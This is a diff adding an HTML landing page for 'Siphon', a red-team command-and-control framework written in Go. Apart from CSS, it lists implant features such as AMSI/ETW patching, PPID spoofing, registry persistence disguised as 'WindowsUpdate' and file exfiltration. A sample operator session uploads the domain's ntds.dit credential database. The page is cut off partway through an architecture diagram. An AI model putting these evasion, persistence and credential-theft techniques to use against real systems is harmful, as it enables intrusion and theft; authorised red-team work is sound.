@@ -1,0 +1,1424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Siphon &mdash; Red Team Command &amp; Control Framework</title>
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --ctp-rosewater: #f5e0dc;
+            --ctp-flamingo: #f2cdcd;
+            --ctp-pink: #f5c2e7;
+            --ctp-mauve: #cba6f7;
+            --ctp-red: #f38ba8;
+            --ctp-maroon: #eba0ac;
+            --ctp-peach: #fab387;
+            --ctp-yellow: #f9e2af;
+            --ctp-green: #a6e3a1;
+            --ctp-teal: #94e2d5;
+            --ctp-sky: #89dceb;
+            --ctp-sapphire: #74c7ec;
+            --ctp-blue: #89b4fa;
+            --ctp-lavender: #b4befe;
+            --ctp-text: #cdd6f4;
+            --ctp-subtext1: #bac2de;
+            --ctp-subtext0: #a6adc8;
+            --ctp-overlay2: #9399b2;
+            --ctp-overlay1: #7f849c;
+            --ctp-overlay0: #6c7086;
+            --ctp-surface2: #585b70;
+            --ctp-surface1: #45475a;
+            --ctp-surface0: #313244;
+            --ctp-base: #1e1e2e;
+            --ctp-mantle: #181825;
+            --ctp-crust: #11111b;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            scrollbar-width: thin;
+            scrollbar-color: var(--ctp-surface1) var(--ctp-crust);
+        }
+
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background-color: var(--ctp-crust);
+            color: var(--ctp-text);
+            line-height: 1.7;
+            font-size: 15px;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: radial-gradient(var(--ctp-surface0) 1px, transparent 1px);
+            background-size: 24px 24px;
+            opacity: 0.3;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0, 0, 0, 0.03) 2px,
+                rgba(0, 0, 0, 0.03) 4px
+            );
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .page-wrap {
+            position: relative;
+            z-index: 1;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        section {
+            margin-bottom: 96px;
+        }
+
+        a {
+            color: var(--ctp-blue);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        a:hover {
+            color: var(--ctp-sapphire);
+        }
+
+        .section-label {
+            display: inline-block;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            color: var(--ctp-overlay0);
+            border: 1px solid var(--ctp-surface1);
+            padding: 4px 12px;
+            border-radius: 2px;
+            margin-bottom: 20px;
+        }
+
+        .section-title {
+            font-size: clamp(22px, 3vw, 30px);
+            font-weight: 700;
+            color: var(--ctp-text);
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+
+        .section-desc {
+            color: var(--ctp-subtext0);
+            font-size: 14px;
+            max-width: 820px;
+            margin-bottom: 40px;
+        }
+
+        /* HERO */
+        .hero {
+            padding: 80px 0 48px;
+            text-align: center;
+            margin-bottom: 64px;
+        }
+
+        .hero-terminal {
+            border: 1px solid var(--ctp-surface1);
+            border-radius: 8px;
+            background: var(--ctp-mantle);
+            max-width: 780px;
+            margin: 0 auto;
+            overflow: hidden;
+            box-shadow: 0 0 0 1px var(--ctp-surface0), 0 24px 80px -12px rgba(0, 0, 0, 0.6), 0 0 120px -40px rgba(148, 226, 213, 0.1);
+        }
+
+        .hero-titlebar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 16px;
+            background: var(--ctp-crust);
+            border-bottom: 1px solid var(--ctp-surface0);
+        }
+
+        .hero-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .hero-dot--red { background: var(--ctp-red); }
+        .hero-dot--yellow { background: var(--ctp-yellow); }
+        .hero-dot--green { background: var(--ctp-green); }
+
+        .hero-titlebar-text {
+            flex: 1;
+            text-align: center;
+            font-size: 12px;
+            color: var(--ctp-overlay0);
+            letter-spacing: 0.05em;
+        }
+
+        .hero-body {
+            padding: 48px 40px 56px;
+        }
+
+        .hero-prompt {
+            font-size: 13px;
+            color: var(--ctp-overlay0);
+            margin-bottom: 24px;
+            letter-spacing: 0.02em;
+        }
+
+        .hero-prompt .prompt-symbol {
+            color: var(--ctp-green);
+        }
+
+        .hero-prompt .prompt-path {
+            color: var(--ctp-blue);
+        }
+
+        .hero-title {
+            font-size: clamp(42px, 7vw, 72px);
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            line-height: 1.05;
+            margin-bottom: 8px;
+            background: linear-gradient(
+                135deg,
+                var(--ctp-teal) 0%,
+                var(--ctp-sky) 25%,
+                var(--ctp-blue) 50%,
+                var(--ctp-lavender) 75%,
+                var(--ctp-mauve) 100%
+            );
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 40px rgba(148, 226, 213, 0.2));
+        }
+
+        .hero-cursor {
+            display: inline-block;
+            width: 3px;
+            height: 0.8em;
+            background: var(--ctp-green);
+            margin-left: 4px;
+            vertical-align: baseline;
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        .hero-tagline {
+            font-size: clamp(14px, 2vw, 17px);
+            color: var(--ctp-subtext0);
+            margin-bottom: 36px;
+            font-weight: 400;
+            line-height: 1.6;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 28px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.02em;
+            border: 1px solid transparent;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-decoration: none;
+        }
+
+        .btn-primary {
+            background: var(--ctp-teal);
+            color: var(--ctp-crust);
+            border-color: var(--ctp-teal);
+        }
+
+        .btn-primary:hover {
+            background: var(--ctp-sky);
+            border-color: var(--ctp-sky);
+            color: var(--ctp-crust);
+            box-shadow: 0 0 24px rgba(148, 226, 213, 0.25);
+        }
+
+        .btn-ghost {
+            background: transparent;
+            color: var(--ctp-subtext1);
+            border-color: var(--ctp-surface1);
+        }
+
+        .btn-ghost:hover {
+            color: var(--ctp-text);
+            border-color: var(--ctp-overlay0);
+            background: var(--ctp-surface0);
+        }
+
+        /* FEATURES GRID */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+        }
+
+        .feature-card {
+            background: var(--ctp-mantle);
+            border: 1px solid var(--ctp-surface0);
+            border-radius: 6px;
+            padding: 28px 24px;
+            transition: all 0.25s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--ctp-blue), transparent);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .feature-card:hover {
+            border-color: var(--ctp-surface1);
+            background: var(--ctp-base);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 32px -8px rgba(0, 0, 0, 0.4);
+        }
+
+        .feature-card:hover::before {
+            opacity: 1;
+        }
+
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 16px;
+            display: block;
+            width: 44px;
+            height: 44px;
+            line-height: 44px;
+            text-align: center;
+            background: var(--ctp-surface0);
+            border-radius: 8px;
+            border: 1px solid var(--ctp-surface1);
+        }
+
+        .feature-card h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--ctp-text);
+            margin-bottom: 8px;
+        }
+
+        .feature-card p {
+            font-size: 13px;
+            color: var(--ctp-subtext0);
+            line-height: 1.6;
+        }
+
+        .feature-card:nth-child(1):hover { border-color: var(--ctp-teal); }
+        .feature-card:nth-child(1):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-teal), transparent); }
+        .feature-card:nth-child(2):hover { border-color: var(--ctp-green); }
+        .feature-card:nth-child(2):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-green), transparent); }
+        .feature-card:nth-child(3):hover { border-color: var(--ctp-blue); }
+        .feature-card:nth-child(3):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-blue), transparent); }
+        .feature-card:nth-child(4):hover { border-color: var(--ctp-peach); }
+        .feature-card:nth-child(4):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-peach), transparent); }
+        .feature-card:nth-child(5):hover { border-color: var(--ctp-mauve); }
+        .feature-card:nth-child(5):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-mauve), transparent); }
+        .feature-card:nth-child(6):hover { border-color: var(--ctp-yellow); }
+        .feature-card:nth-child(6):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-yellow), transparent); }
+        .feature-card:nth-child(7):hover { border-color: var(--ctp-red); }
+        .feature-card:nth-child(7):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-red), transparent); }
+        .feature-card:nth-child(8):hover { border-color: var(--ctp-flamingo); }
+        .feature-card:nth-child(8):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-flamingo), transparent); }
+
+        /* TERMINAL MOCKUP */
+        .mockup-section {
+            text-align: center;
+        }
+
+        .mockup-frame {
+            border: 1px solid var(--ctp-surface1);
+            border-radius: 8px;
+            overflow: hidden;
+            background: var(--ctp-mantle);
+            box-shadow: 0 0 0 1px var(--ctp-surface0), 0 32px 80px -16px rgba(0, 0, 0, 0.5), 0 0 160px -60px rgba(148, 226, 213, 0.06);
+            max-width: 900px;
+            margin: 0 auto;
+            text-align: left;
+        }
+
+        .mockup-titlebar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            background: var(--ctp-crust);
+            border-bottom: 1px solid var(--ctp-surface0);
+        }
+
+        .mockup-titlebar-text {
+            flex: 1;
+            text-align: center;
+            font-size: 12px;
+            color: var(--ctp-overlay0);
+        }
+
+        .mockup-body {
+            padding: 28px;
+        }
+
+        .mockup-line {
+            font-size: 13px;
+            line-height: 1.8;
+        }
+
+        .mockup-line .prompt { color: var(--ctp-green); user-select: none; }
+        .mockup-line .cmd { color: var(--ctp-text); }
+        .mockup-line .flag { color: var(--ctp-peach); }
+        .mockup-line .arg { color: var(--ctp-yellow); }
+        .mockup-line .comment { color: var(--ctp-overlay0); }
+
+        .mockup-output {
+            border: 1px solid var(--ctp-surface0);
+            border-radius: 4px;
+            padding: 16px 20px;
+            margin: 12px 0;
+            background: var(--ctp-base);
+            font-size: 13px;
+            line-height: 1.7;
+        }
+
+        .mockup-output .section-hdr {
+            color: var(--ctp-mauve);
+            font-weight: 700;
+        }
+
+        .mockup-output .label {
+            color: var(--ctp-teal);
+        }
+
+        .mockup-output .value {
+            color: var(--ctp-text);
+        }
+
+        .mockup-output .dim {
+            color: var(--ctp-overlay0);
+        }
+
+        .mockup-output .ok {
+            color: var(--ctp-green);
+            font-weight: 600;
+        }
+
+        .mockup-output .hash {
+            color: var(--ctp-overlay1);
+            font-size: 11px;
+        }
+
+        .mockup-caption {
+            margin-top: 20px;
+            font-size: 13px;
+            color: var(--ctp-overlay1);
+            font-style: italic;
+            text-align: center;
+        }
+
+        /* ARCHITECTURE */
+        .arch-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 24px;
+        }
+
+        .arch-terminal {
+            border: 1px solid var(--ctp-surface1);
+            border-radius: 8px;
+            overflow: hidden;
+            background: var(--ctp-mantle);
+            box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.4);
+        }
+
+        .arch-titlebar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            background: var(--ctp-crust);
+            border-bottom: 1px solid var(--ctp-surface0);
+        }
+
+        .arch-titlebar-text {
+            flex: 1;
+            text-align: center;
+            font-size: 12px;
+            color: var(--ctp-overlay0);
+        }
+
+        .arch-body {
+            padding: 32px;
+        }
+
+        .arch-panel {
+            padding: 20px;
+            border: 1px solid var(--ctp-surface0);
+            border-radius: 4px;
+            background: var(--ctp-base);
+        }
+
+        .arch-panel-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+
+        .arch-panel-marker {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--ctp-crust);
+            background: var(--ctp-teal);
+            padding: 2px 10px;
+            border-radius: 3px;
+            flex-shrink: 0;
+        }
+
+        .arch-panel:nth-child(2) .arch-panel-marker { background: var(--ctp-blue); }
+
+        .arch-panel h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--ctp-text);
+        }
+
+        .arch-panel pre {
+            font-size: 12px;
+            line-height: 1.7;
+            color: var(--ctp-subtext0);
+            white-space: pre;
+            overflow-x: auto;
+        }
+
+        .arch-panel pre .dir {
+            color: var(--ctp-blue);
+            font-weight: 600;
+        }
+
+        .arch-panel pre .file {
+            color: var(--ctp-text);
+        }
+
+        .arch-panel pre .desc {
+            color: var(--ctp-overlay1);
+        }
+
+        .arch-panel pre .box {
+            color: var(--ctp-teal);
+        }
+
+        .arch-panel pre .arrow {
+            color: var(--ctp-green);
+        }
+
+        .arch-panel pre .lbl {
+            color: var(--ctp-sky);
+        }
+
+        .arch-divider {
+            border: none;
+            border-top: 1px dashed var(--ctp-surface1);
+            margin: 28px 0;
+        }
+
+        .arch-stack {
+            font-size: 13px;
+            color: var(--ctp-subtext0);
+            text-align: center;
+        }
+
+        .arch-stack span {
+            display: inline-block;
+            padding: 4px 14px;
+            border: 1px solid var(--ctp-surface1);
+            border-radius: 3px;
+            margin: 4px;
+            background: var(--ctp-base);
+            color: var(--ctp-subtext1);
+            font-size: 12px;
+        }
+
+        /* BUILD TABLE */
+        .build-table-wrap {
+            overflow-x: auto;
+            border: 1px solid var(--ctp-surface1);
+            border-radius: 8px;
+            background: var(--ctp-mantle);
+        }
+
+        .build-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+
+        .build-table th {
+            background: var(--ctp-crust);
+            color: var(--ctp-subtext1);
+            font-weight: 600;
+            font-size: 12px;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+            padding: 14px 20px;
+            text-align: left;
+            border-bottom: 1px solid var(--ctp-surface0);
+        }
+
+        .build-table td {
+            padding: 12px 20px;
+            color: var(--ctp-subtext0);
+            border-bottom: 1px solid var(--ctp-surface0);
+        }
+
+        .build-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .build-table tr:hover td {
+            background: var(--ctp-base);
+        }
+
+        .build-table td:first-child {
+            color: var(--ctp-peach);
+            font-weight: 500;
+        }
+
+        .build-table td:nth-child(2) {
+            color: var(--ctp-text);
+        }
+
+        /* GETTING STARTED */
+        .start-row {
+            display: flex;
+            gap: 40px;
+            align-items: flex-start;
+        }
+
+        .start-terminal {
+            border: 1px solid var(--ctp-surface1);
+            border-radius: 8px;
+            overflow: hidden;
+            background: var(--ctp-mantle);
+            box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.4);
+            flex: 1;
+            min-width: 0;
+        }
+
+        .start-titlebar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            background: var(--ctp-crust);
+            border-bottom: 1px solid var(--ctp-surface0);
+        }
+
+        .start-titlebar-text {
+            flex: 1;
+            text-align: center;
+            font-size: 12px;
+            color: var(--ctp-overlay0);
+        }
+
+        .start-body {
+            padding: 28px 32px;
+        }
+
+        .start-line {
+            margin-bottom: 4px;
+            font-size: 14px;
+            line-height: 1.8;
+        }
+
+        .start-line .prompt { color: var(--ctp-green); user-select: none; }
+        .start-line .cmd { color: var(--ctp-text); }
+        .start-line .comment { color: var(--ctp-overlay0); }
+        .start-line .flag { color: var(--ctp-peach); }
+        .start-line .arg { color: var(--ctp-yellow); }
+
+        .start-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .start-info p {
+            font-size: 14px;
+            color: var(--ctp-subtext0);
+            margin-bottom: 12px;
+            line-height: 1.7;
+        }
+
+        .start-info code {
+            font-size: 13px;
+            color: var(--ctp-peach);
+            background: var(--ctp-surface0);
+            padding: 2px 8px;
+            border-radius: 3px;
+            border: 1px solid var(--ctp-surface1);
+        }
+
+        /* FOOTER */
+        .site-footer {
+            border-top: 1px solid var(--ctp-surface0);
+            padding: 48px 0;
+            text-align: center;
+            margin-top: 32px;
+        }
+
+        .footer-title {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            margin-bottom: 12px;
+            background: linear-gradient(
+                135deg,
+                var(--ctp-teal) 0%,
+                var(--ctp-sky) 25%,
+                var(--ctp-blue) 50%,
+                var(--ctp-lavender) 75%,
+                var(--ctp-mauve) 100%
+            );
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .footer-tagline {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--ctp-subtext1);
+            margin-bottom: 24px;
+            letter-spacing: 0.02em;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin-bottom: 28px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            font-size: 13px;
+            color: var(--ctp-overlay1);
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: var(--ctp-blue);
+        }
+
+        .footer-copy {
+            font-size: 12px;
+            color: var(--ctp-overlay0);
+        }
+
+        .footer-disclaimer {
+            font-size: 11px;
+            color: var(--ctp-overlay0);
+            margin-top: 16px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.6;
+        }
+
+        /* SCROLL ANIMATION */
+        .reveal {
+            opacity: 0;
+            transform: translateY(24px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        .reveal.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 900px) {
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .arch-grid {
+                grid-template-columns: 1fr;
+            }
+            .hero-body {
+                padding: 36px 24px 44px;
+            }
+            .start-row {
+                flex-direction: column;
+                gap: 24px;
+            }
+        }
+
+        @media (max-width: 600px) {
+            body {
+                font-size: 14px;
+            }
+            .page-wrap {
+                padding: 0 16px;
+            }
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+            section {
+                margin-bottom: 64px;
+            }
+            .hero {
+                padding: 48px 0 32px;
+            }
+            .hero-body {
+                padding: 28px 20px 36px;
+            }
+            .hero-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            .btn {
+                width: 100%;
+                max-width: 260px;
+                justify-content: center;
+            }
+            .arch-body {
+                padding: 20px;
+            }
+            .start-body {
+                padding: 20px;
+            }
+            .start-line {
+                font-size: 12px;
+            }
+            .feature-card {
+                padding: 22px 20px;
+            }
+            .mockup-body {
+                padding: 16px;
+            }
+        }
+
+        ::selection {
+            background: rgba(148, 226, 213, 0.25);
+            color: var(--ctp-text);
+        }
+
+        a:focus-visible, .btn:focus-visible {
+            outline: 2px solid var(--ctp-teal);
+            outline-offset: 2px;
+        }
+    </style>
+</head>
+<body>
+    <div class="page-wrap">
+
+        <!-- HERO -->
+        <section class="hero">
+            <div class="hero-terminal">
+                <div class="hero-titlebar">
+                    <div class="hero-dot hero-dot--red"></div>
+                    <div class="hero-dot hero-dot--yellow"></div>
+                    <div class="hero-dot hero-dot--green"></div>
+                    <div class="hero-titlebar-text">siphon &mdash; operator console</div>
+                </div>
+                <div class="hero-body">
+                    <div class="hero-prompt">
+                        <span class="prompt-symbol">&#10095;</span> <span class="prompt-path">~/siphon</span>
+                    </div>
+                    <h1 class="hero-title">
+                        Siphon<span class="hero-cursor"></span>
+                    </h1>
+                    <p class="hero-tagline">
+                        Lightweight C2 framework with per-session forward secrecy, encrypted transport, and runtime evasion. Built in Go.
+                    </p>
+                    <div class="hero-buttons">
+                        <a href="#quick-start" class="btn btn-primary">Get Started</a>
+                        <a href="#" class="btn btn-ghost">View Source</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- FEATURES -->
+        <section class="reveal">
+            <div class="section-label">// capabilities</div>
+            <h2 class="section-title">Encrypted C2. Zero disk footprint.</h2>
+            <p class="section-desc">
+                Deploy a lightweight implant on the target. Communicate over encrypted HTTPS with per-session ECDH key exchange. Exfiltrate files, execute commands, and persist &mdash; all through an interactive operator console.
+            </p>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <span class="feature-icon">&#x1F510;</span>
+                    <h3>Forward Secrecy</h3>
+                    <p>Ephemeral ECDH P-256 key exchange per session. Server public key embedded at build time &mdash; no config files on disk.</p>
+                </div>
+                <div class="feature-card">
+                    <span class="feature-icon">&#x1F6E1;</span>
+                    <h3>Encrypted Transport</h3>
+                    <p>AES-256-GCM authenticated encryption with HMAC-SHA256 message authentication covering all envelope fields.</p>
+                </div>
+                <div class="feature-card">
+                    <span class="feature-icon">&#x1F310;</span>
+                    <h3>TLS Fingerprinting</h3>
+                    <p>uTLS with Chrome JA3 fingerprint. Cookie-based beacon transport blends with normal HTTPS traffic.</p>
+                </div>
+                <div class="feature-card">
+                    <span class="feature-icon">&#x1F47B;</span>
+                    <h3>Runtime Evasion</h3>
+                    <p>ETW and AMSI patching on startup. PPID spoofing under explorer.exe. CREATE_NO_WINDOW for stealth.</p>
+                </div>
+                <div class="feature-card">
+                    <span class="feature-icon">&#x1F4CC;</span>
+                    <h3>Persistence</h3>
+                    <p>Registry run keys, scheduled tasks, and startup folder. All methods include cleanup via unpersist commands.</p>
+                </div>
+                <div class="feature-card">
+                    <span class="feature-icon">&#x1F4BE;</span>
+                    <h3>Encrypted Loot</h3>
+                    <p>Exfiltrated files encrypted at rest with AES-256-GCM. Path traversal protection on implant-controlled IDs.</p>
+                </div>
+                <div class="feature-card">
+                    <span class="feature-icon">&#x26A1;</span>
+                    <h3>Resource Limits</h3>
+                    <p>Max 1000 implants, 1000 results per implant, 512 KB upload chunks, 24h max sleep, input size limits.</p>
+                </div>
+                <div class="feature-card">
+                    <span class="feature-icon">&#x1F5A5;</span>
+                    <h3>Operator Console</h3>
+                    <p>Interactive CLI with Catppuccin Mocha palette. Prefix-match selection, task queuing, live results.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- OPERATOR SESSION -->
+        <section class="mockup-section reveal">
+            <div class="section-label">// in action</div>
+            <h2 class="section-title">Operator Session</h2>
+            <p class="section-desc" style="margin-left: auto; margin-right: auto;">
+                Deploy the server, catch a beacon, and interact with the implant &mdash; all from an encrypted, authenticated channel.
+            </p>
+            <div class="mockup-frame">
+                <div class="mockup-titlebar">
+                    <div class="hero-dot hero-dot--red" style="width: 10px; height: 10px;"></div>
+                    <div class="hero-dot hero-dot--yellow" style="width: 10px; height: 10px;"></div>
+                    <div class="hero-dot hero-dot--green" style="width: 10px; height: 10px;"></div>
+                    <div class="mockup-titlebar-text">siphon &mdash; operator</div>
+                </div>
+                <div class="mockup-body">
+                    <div class="mockup-line"><span class="prompt">&#10095; </span><span class="cmd">./build/siphon-server <span class="flag">-listen</span> <span class="arg">:443</span> <span class="flag">-auth</span> <span class="arg">s3cret</span></span></div>
+                    <div class="mockup-output">
+                        <span class="label">[server]</span> <span class="value">listening on :443 (HTTPS)</span><br>
+                        <span class="label">[beacon]</span> <span class="value">new implant registered: </span><span class="ok">d8a7822b</span> <span class="dim">(windows/amd64)</span>
+                    </div>
+                    <div class="mockup-line" style="margin-top: 16px;"><span class="prompt">siphon&gt; </span><span class="cmd">interact <span class="arg">d8a7822b</span></span></div>
+                    <div class="mockup-output">
+                        <span class="ok">[+]</span> <span class="value">interacting with d8a7822b</span> <span class="dim">(CORP\admin@DC01)</span>
+                    </div>
+                    <div class="mockup-line" style="margin-top: 16px;"><span class="prompt">siphon(d8a7822b)&gt; </span><span class="cmd">cmd <span class="arg">whoami</span></span></div>
+                    <div class="mockup-output">
+                        <span class="ok">[+]</span> <span class="value">task queued: </span><span class="dim">e5b97d57</span><br>
+                        <span class="label">[submit]</span> <span class="value">result from d8a7822b task=e5b97d57 success=true</span><br>
+                        <br>
+                        <span class="dim">&#x2504;&#x2504;&#x2504;</span> <span class="ok">[ok]</span> <span class="dim">task=e5b97d57 &#x2504;&#x2504;&#x2504;</span><br>
+                        <span class="value">corp\admin</span>
+                    </div>
+                    <div class="mockup-line" style="margin-top: 16px;"><span class="prompt">siphon(d8a7822b)&gt; </span><span class="cmd">upload <span class="arg">C:\Windows\NTDS\ntds.dit</span></span></div>
+                    <div class="mockup-output">
+                        <span class="ok">[+]</span> <span class="value">upload task queued: ntds.dit</span> <span class="dim">&rarr; server (loot/d8a7822b/)</span><br>
+                        <span class="label">[loot]</span> <span class="value">saved 16384 bytes (encrypted)</span> <span class="dim">&rarr; loot/d8a7822b/a3f2c1.enc</span>
+                    </div>
+                    <div class="mockup-line" style="margin-top: 16px;"><span class="prompt">siphon(d8a7822b)&gt; </span><span class="cmd">persist <span class="flag">registry</span> <span class="arg">WindowsUpdate</span></span></div>
+                    <div class="mockup-output">
+                        <span class="ok">[+]</span> <span class="value">persist task queued: method=registry</span><br>
+                        <span class="value">registry run key added: </span><span class="ok">WindowsUpdate</span> <span class="dim">&rarr; C:\...\OneDriveStandaloneUpdater.exe</span>
+                    </div>
+                    <p class="mockup-caption">Encrypted C2 session &mdash; per-session ECDH keys, AES-256-GCM transport.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ARCHITECTURE -->
+        <section class="reveal">
+            <div class="section-label">// architecture</div>
+            <h2 class="section-title">Three layers. Build-time config.</h2>
+            <p class="section-desc">
+                Shared protocol types, a beacon-loop implant with ECDH key exchange, and an operator server with encrypted loot storage. All implant configuration is baked at compile time via ldflags &mdash; the binary takes zero config files.
+            </p>
+            <div class="arch-terminal">
+                <div class="arch-titlebar">
+                    <div class="hero-dot hero-dot--red" style="width: 10px; height: 10px;"></div>
+                    <div class="hero-dot hero-dot--yellow" style="width: 10px; height: 10px;"></div>
+                    <div class="hero-dot hero-dot--green" style="width: 10px; height: 10px;"></div>
+                    <div class="arch-titlebar-text">project layout</div>
+                </div>
+                <div class="arch-body">
+                    <div class="arch-grid">
+                        <div class="arch-panel">
+                            <div class="arch-panel-header">
+                                <div class="arch-panel-marker">SRC</div>
+                                <h3>Project Structure</h3>
+                            </div>
+<pre>
+<span class="dir">shared/</span>
+  <span class="file">types.go</span>          <span class="desc">Protocol types &amp; HMAC auth</span>
+
+<span class="dir">implant/</span>
+  <span class="file">main.go</span>           <span class="desc">Beacon loop with backoff</span>
+  <span class="file">comms.go</span>          <span class="desc">ECDH + AES-256-GCM</span>
+  <span class="file">transport.go</span>      <span class="desc">HTTPS client (uTLS)</span>
+  <span class="file">tasks.go</span>          <span class="desc">Task dispatcher</span>
+  <span class="file">evasion_*.go</span>      <span class="desc">PPID spoofing, stealth</span>
+  <span class="file">patches_*.go</span>      <span class="desc">ETW/AMSI patching</span>
+  <span class="file">persist_*.go</span>      <span class="desc">Registry, schtask, startup</span>
+
+<span class="dir">server/</span>
+  <span class="file">handlers.go</span>       <span class="desc">Beacon &amp; submit handlers</span>
+  <span class="file">crypto.go</span>         <span class="desc">Key exchange &amp; encryption</span>
+  <span class="file">cli.go</span>            <span class="desc">Operator console</span>
+  <span class="file">cmd/main.go</span>       <span class="desc">Entry point &amp; TLS gen</span>
+</pre>
+                        </div>
+                        <div class="arch-panel">
+                            <div class="arch-panel-header">
+                                <div class="arch-panel-marker">FLOW</div>
+                                <h3>Data Flow</h3>
+                            </div>
+<pre>
+<span class="box">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;</span>         <span class="box">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;</span>
+<span class="box">&#x2502;</span>  <span class="lbl">Implant</span> <span class="box">&#x2502;</span>         <span class="box">&#x2502;</span>  <span class="lbl">Server</span>  <span class="box">&#x2502;</span>
+<span class="box">&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x252C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</span>         <span class="box">&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x252C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</span>
+     <span class="box">&#x2502;</span>                    <span class="box">&#x2502;</span>
+     <span class="box">&#x2502;</span> <span class="desc">HTTPS GET /beacon</span>  <span class="box">&#x2502;</span>
+     <span class="arrow">&#x251C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;</span><span class="box">&#x2502;</span>
+     <span class="box">&#x2502;</span>                    <span class="box">&#x2502;</span>
+     <span class="box">&#x2502;</span>  <span class="desc">Encrypted Task</span>    <span class="box">&#x2502;</span>
